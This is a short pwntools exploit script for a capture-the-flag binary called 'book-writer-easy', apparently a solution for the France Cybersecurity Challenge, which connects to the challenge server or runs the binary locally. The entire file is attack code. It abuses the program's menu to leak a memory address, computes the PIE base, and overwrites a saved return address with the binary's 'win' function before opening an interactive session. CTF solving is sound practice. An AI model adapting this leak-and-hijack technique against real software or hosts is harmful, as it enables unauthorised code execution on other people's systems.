from pwn import *


if args.LOCAL:
    io = process('./book-writer-easy')
    if args.GDB:
        cmd="""
        b* read_page
        """
        gdb.attach(io, cmd)
else: 
    io = remote('challenges.france-cybersecurity-challenge.fr', 2112)
    
elf = ELF('./book-writer-easy')

io.sendline(b'1')
io.sendline(b'a'*10)
io.sendline(str(u64(p64(0xf000000000000001))).encode())

io.sendline(b'1')
io.sendline(b'a'*10)
io.sendline(b'2')

io.sendline(b'2')
io.sendline(b'0')
io.sendline(b'5')

io.sendline(b'4')
io.recvuntil(b'\x00')
io.recv(0x10-1)

pie = u64(io.recv(6)+b'\0\0') - 0x11f9

print(hex(pie))

io.sendline(b'3')
io.sendline(b'A'*0x18+p64(pie+elf.sym.win))
io.sendline(b'2')
io.sendline(b'1')
io.sendline(b'3')
io.sendline(b'aaaaaa')
io.interactive()
